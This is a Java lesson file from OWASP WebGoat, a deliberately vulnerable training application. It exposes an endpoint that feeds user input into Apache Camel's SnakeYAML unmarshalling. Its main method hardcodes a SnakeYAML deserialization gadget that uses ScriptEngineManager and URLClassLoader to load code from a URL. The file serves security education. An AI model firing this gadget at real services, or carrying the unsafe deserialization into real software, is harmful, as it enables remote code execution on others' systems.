/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.lessons.osscamelsnakeyaml;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;
import org.apache.camel.CamelContext;
import org.apache.camel.Converter;
import org.apache.camel.ProducerTemplate;
import org.apache.camel.TypeConverters;
import org.apache.camel.builder.RouteBuilder;
import org.apache.camel.component.snakeyaml.SnakeYAMLDataFormat;
import org.apache.camel.impl.DefaultCamelContext;
import org.apache.camel.model.dataformat.YAMLLibrary;
import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"vulnerable-camel-snakeyaml.hint"})
public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint {

  Logger log = LoggerFactory.getLogger(this.getClass().getName());

  @PostMapping("/VulnerableCamelSnakeYamlComponents/CVE-2017-3139")
  public @ResponseBody AttackResult ConstructorWithload(@RequestParam String payload) {
    // https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECAMEL-30209
    log.info("VulnerableCamelSnakeYamlComponents/CVE-2017-3139 called with payload : {}", payload);
    //		SnakeYAMLDataFormat

    try {
      CamelContext camelctx = new DefaultCamelContext();
      camelctx.addRoutes(
          new RouteBuilder() {
            @Override
            public void configure() throws Exception {
              from("direct:start").marshal().yaml(YAMLLibrary.SnakeYAML);
            }
          });

      ClassLoader loader = SnakeYAMLDataFormat.class.getClassLoader();
      loader = loader.loadClass("org.yaml.snakeyaml.Yaml").getClassLoader();
      log.info("snakeyaml class loaded {}", loader);
      camelctx.getTypeConverterRegistry().addTypeConverters(new Test1(new ObjectMapper()));
      camelctx.start();

      ProducerTemplate template = camelctx.createProducerTemplate();
      Test1 result = template.requestBody("direct:start", payload, Test1.class);
      // Assert.assertEquals(CUSTOMER_YAML, result.trim());
    } catch (IllegalArgumentException ex) {
      return success(this)
          .feedback("vulnerable-camel-snakeyaml-components.success")
          .output(ex.getMessage())
          .build();
    } catch (Exception ex) {
      ex.printStackTrace();
      return failed(this)
          .feedback("vulnerable-camel-snakeyaml-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-camel-snakeyaml-components.fromXML")
        .feedbackArgs(payload)
        .build();
  }

  public static void main(String[] args) {

    String payload =
        "some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL"
            + " [\"http://localhost:8000/\"]]]]";

    try {
      CamelContext camelctx = new DefaultCamelContext();
      camelctx.addRoutes(
          new RouteBuilder() {
            @Override
            public void configure() throws Exception {
              from("direct:start").marshal().yaml(YAMLLibrary.SnakeYAML);
            }
          });

      ClassLoader loader = SnakeYAMLDataFormat.class.getClassLoader();
      loader = loader.loadClass("org.yaml.snakeyaml.Yaml").getClassLoader();
      // log.info("snakeyaml class loaded {}", loader);
      camelctx.setStreamCaching(true);
      camelctx.start();
     

      ProducerTemplate template = camelctx.createProducerTemplate();
      Test1 result = template.requestBody("direct:start", payload, Test1.class);
      // Assert.assertEquals(CUSTOMER_YAML, result.trim());
    } catch (IllegalArgumentException ex) {
      ex.printStackTrace();
      //	return
      // success(this).feedback("vulnerable-camel-snakeyaml-components.success").output(ex.getMessage()).build();
    } catch (Exception ex) {
      ex.printStackTrace();
      // return
      // failed(this).feedback("vulnerable-camel-snakeyaml-components.close").output(ex.getMessage()).build();
    }
  }
}

